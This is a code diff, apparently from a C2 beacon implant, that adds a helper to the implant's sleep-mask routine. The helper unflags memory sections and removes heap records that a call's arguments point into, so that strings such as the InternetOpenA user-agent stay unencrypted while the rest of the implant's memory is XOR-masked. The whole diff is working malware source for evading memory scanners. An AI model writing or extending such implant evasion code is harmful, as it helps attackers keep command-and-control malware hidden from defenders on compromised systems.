@@ -404,6 +404,55 @@ void beacon_info_fill(BEACON_INFO * info, char * sm_base, DWORD sm_text, DWORD s
 	}
 }
 
+/* A user mask XORs what the info flags. An argument that points into a
+ * flagged section or a heap record would read as ciphertext in the
+ * callee - the user-agent string handed to InternetOpenA lives in the
+ * settings table. The built-in engine keeps such a block in the clear
+ * (bw_keep_plaintext); the same rule for a user mask: for this one
+ * call the section is not flagged and the record is left out. The heap
+ * list is shared (a cached walk), so the shortened copy goes into the
+ * caller's `copy` and the info points there. */
+void beacon_info_keep_plaintext(BEACON_INFO * info, const unsigned long long * args, int nargs,
+                                 HEAP_RECORD * copy, int max)
+{
+	ALLOCATED_MEMORY_REGION * reg;
+	ALLOCATED_MEMORY_SECTION * s;
+	HEAP_RECORD * hr;
+	unsigned long long v;
+	int r, k, a, n, w;
+
+	if (info == NULL || args == NULL || nargs <= 0)
+		return;
+	for (a = 0; a < nargs; a++) {
+		v = args[a];
+		if (v == 0)
+			continue;
+		for (r = 0; r < 6; r++) {
+			reg = &info->allocatedMemory.AllocatedMemoryRegions[r];
+			for (k = 0; k < 8; k++) {
+				s = &reg->Sections[k];
+				if (s->BaseAddress != NULL && v >= (unsigned long long)(size_t)s->BaseAddress &&
+				    v < (unsigned long long)(size_t)s->BaseAddress + s->VirtualSize)
+					s->MaskSection = FALSE;
+			}
+		}
+	}
+
+	hr = info->heap_records;
+	if (hr == NULL || copy == NULL || max <= 1)
+		return;
+	for (n = 0, w = 0; hr[n].ptr != NULL && w < max - 1; n++) {
+		int drop = 0;
+		for (a = 0; a < nargs && !drop; a++)
+			drop = args[a] != 0 && (char *)args[a] >= hr[n].ptr && (char *)args[a] < hr[n].ptr + hr[n].size;
+		if (!drop)
+			copy[w++] = hr[n];
+	}
+	copy[w].ptr = NULL;
+	copy[w].size = 0;
+	info->heap_records = copy;
+}
+
 BOOL BeaconInformation(BEACON_INFO * info)
 {
 	beacon_info_fill(info, g_sm_exec, g_sm_text, g_sm_total);
